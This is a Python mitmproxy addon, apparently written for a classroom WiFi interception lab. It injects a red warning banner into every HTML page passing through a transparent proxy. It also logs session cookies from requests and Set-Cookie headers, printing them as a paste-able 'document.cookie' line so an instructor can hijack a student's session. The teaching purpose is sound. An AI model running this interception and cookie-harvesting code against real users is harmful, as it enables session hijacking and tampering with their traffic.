#!/usr/bin/env python3
"""
Enterprise WiFi Lab — Active injection + session hijacking demo addon.

Two effects, one addon:

1. INJECTS a visible red banner into every HTML response, proving that the
   AP operator can not only OBSERVE but also MODIFY content the browser
   renders, even on HTTPS — once the CA is trusted on the client.

2. LOGS session cookies passing through the proxy (request + Set-Cookie
   headers), tagged with [SESSION], so the instructor can hijack a student
   session by pasting the captured cookie into a clean browser.

REQUIRES: mitmproxy CA must be trusted on the client device (Demo B). Without
          a trusted CA the browser rejects the TLS handshake and no HTML
          response ever reaches the addon.

Usage via lab helper:
  sudo ./mitm-control.sh inject on
  sudo journalctl -u enterprise.service -f --no-pager | grep -E '\\[INJECT\\]|\\[SESSION\\]'

Or manually:
  sudo mitmdump --mode transparent --showhost --listen-port 8080 \\
                --listen-host 0.0.0.0 --set tls_version_client_min=TLS1_2 \\
                -s /path/to/mitm_inject_banner.py
"""

import re
from mitmproxy import http

# ---------------------------------------------------------------------------
# Banner — pure HTML/CSS/JS, injected just before </body> on every HTML page.
# Pinned at the top of the viewport with high z-index so it overlays anything.
# Does NOT contain the literal "</body>" string (would confuse re-injection).
# ---------------------------------------------------------------------------
BANNER_HTML = b"""
<div id="__lab_mitm_banner__" style="
  position:fixed;top:0;left:0;right:0;z-index:2147483647;
  background:#cc0000;color:#fff;padding:14px 20px;
  font-family:-apple-system,system-ui,sans-serif;font-size:15px;
  font-weight:bold;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.3);
  border-bottom:3px solid #800000;">
  &#9888; Este contenido fue MODIFICADO por el operador de
  <span style="font-family:monospace">CorpNet-Enterprise</span>
  &mdash; tu navegador no te ha avisado.
</div>
<script>
  (function(){
    try {
      console.warn("[MITM-LAB] Banner injected by AP operator. " +
                   "If you can read this, your TLS trust was bypassed.");
    } catch(e) {}
  })();
</script>
"""

# ---------------------------------------------------------------------------
# Cookie heuristics — names that typically carry session state.
# Matching is case-insensitive and substring-based.
# ---------------------------------------------------------------------------
SESSION_COOKIE_HINTS = (
    "session", "sessid", "sid",
    "auth", "token", "jwt",
    "phpsessid", "jsessionid", "connect.sid",
    "remember", "logged_in",
)

# Content types whose body will receive the banner. Match the prefix so
# "text/html; charset=utf-8" also qualifies.
INJECT_TYPES = ("text/html",)

# Regex used to insert the banner before the closing </body> tag.
# Falls back to appending at the end of the body if </body> isn't found.
BODY_CLOSE_RE = re.compile(rb"</body\s*>", re.IGNORECASE)


def _looks_like_session_cookie(name: str) -> bool:
    n = name.lower()
    return any(hint in n for hint in SESSION_COOKIE_HINTS)


def _extract_session_cookies(cookie_header: str) -> list[tuple[str, str]]:
    """Parse a Cookie: header value and return [(name, value), ...] for
    cookies whose name looks session-related."""
    out: list[tuple[str, str]] = []
    for pair in cookie_header.split(";"):
        if "=" not in pair:
            continue
        name, _, value = pair.strip().partition("=")
        if _looks_like_session_cookie(name):
            out.append((name, value))
    return out


# ---------------------------------------------------------------------------
# Cookie capture — runs on every request, logs interesting cookies
# ---------------------------------------------------------------------------
def request(flow: http.HTTPFlow) -> None:
    cookie_header = flow.request.headers.get("cookie", "")
    if not cookie_header:
        return

    interesting = _extract_session_cookies(cookie_header)
    if not interesting:
        return

    src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
    cookie_string = "; ".join(f"{n}={v}" for n, v in interesting)
    print(
        f"\n{'='*60}\n"
        f"[SESSION] {flow.request.method} {flow.request.pretty_url}\n"
        f"[SESSION] Source IP : {src_ip}\n"
        f"[SESSION] Cookie    : {cookie_string}\n"
        f"[SESSION] Paste-able: document.cookie = '{cookie_string}';\n"
        f"{'='*60}"
    )


# ---------------------------------------------------------------------------
# Banner injection — runs on every response, modifies HTML bodies
# ---------------------------------------------------------------------------
def response(flow: http.HTTPFlow) -> None:
    # Set-Cookie capture: if the server is HANDING OUT a session cookie,
    # log it too — useful when the student logs in fresh.
    for set_cookie in flow.response.headers.get_all("set-cookie"):
        name = set_cookie.split("=", 1)[0].strip()
        if _looks_like_session_cookie(name):
            src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
            print(
                f"\n{'='*60}\n"
                f"[SESSION] NEW Set-Cookie from {flow.request.pretty_host}\n"
                f"[SESSION] Client IP : {src_ip}\n"
                f"[SESSION] Set-Cookie: {set_cookie}\n"
                f"{'='*60}"
            )

    # Banner injection: only on text/html responses with a body.
    content_type = flow.response.headers.get("content-type", "").lower()
    if not any(ct in content_type for ct in INJECT_TYPES):
        return

    # Skip non-2xx responses to avoid rewriting error pages incorrectly.
    if not (200 <= flow.response.status_code < 300):
        return

    body = flow.response.get_content()
    if not body:
        return

    # Idempotency: if our banner is already in the body, don't re-inject.
    if b"__lab_mitm_banner__" in body:
        return

    # Inject just before </body>; if not present, append to end.
    new_body, count = BODY_CLOSE_RE.subn(BANNER_HTML + b"</body>", body, count=1)
    if count == 0:
        new_body = body + BANNER_HTML

    flow.response.set_content(new_body)
    print(
        f"[INJECT] {flow.request.pretty_host}{flow.request.path} "
        f"— banner injected ({len(body)} → {len(new_body)} bytes)"
    )
